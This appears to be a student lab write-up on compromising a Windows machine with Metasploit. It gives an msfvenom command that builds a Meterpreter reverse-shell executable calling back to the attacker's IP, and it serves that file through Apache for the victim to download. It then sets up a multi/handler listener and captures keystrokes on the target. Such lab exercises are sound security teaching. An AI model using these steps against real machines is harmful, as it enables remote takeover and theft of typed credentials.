# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:

Find the attackers ip address using ifconfig
## OUTPUT:
![alt text](output1.png)


Create a malicious executable file fun.exe using msfvenom command
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe
## OUTPUT:
![alt text](output2.png)

copy the fun.exe into the apache /var/www/html folder
## OUTPUT:
![alt text](output3.png)

Start apache server
sudo systemctl apache2 start
## OUTPUT:
![alt text](output4.png)

Check the status of apache2
## OUTPUT:
![alt text](output5.png)

Invoke msfconsole:
## OUTPUT:

![alt text](output6.png)


Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.
## OUTPUT:
![alt text](output7.png)


Starting a command and control Server
use multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 0.0.0.0

## OUTPUT:
![alt text](output8.png)



On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine:
http://192.168.1.2/fun.exe  ( Replace IP address appropriately)
The file "fun.exe" downloads. 

## OUTPUT:
![alt text](output9.png)


To see a list of processes, at the meterpreter > prompt, execute this command:
ps  ⇒ can see the fun.exe process running with pid 1156

## OUTPUT:
![alt text](output10.png)


Post Exploitation
The target is now owned. Following are meterpreter commands for key capturing in the target machine
keyscan_start	Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.
## OUTPUT:
![alt text](output11.png)



keyscan_dump	Shows the keystrokes captured so far
## OUTPUT:
![alt text](output12.png)

## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.

